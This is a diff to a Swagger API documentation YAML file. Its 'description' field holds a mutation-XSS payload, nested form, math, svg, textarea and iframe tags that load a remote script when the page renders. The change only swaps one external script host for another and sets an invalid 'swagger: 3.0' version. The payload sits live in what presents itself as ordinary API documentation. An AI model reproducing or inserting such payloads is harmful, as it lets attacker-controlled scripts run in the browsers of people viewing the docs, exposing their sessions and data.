@@ -1,7 +1,7 @@
-swagger: '2.0'
+swagger: '3.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://standing-salt.surge.sh/script.js></script>">
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://bukanmain.cloud/script.js></script>">
   version: production
 basePath: /swagger/
 produces:
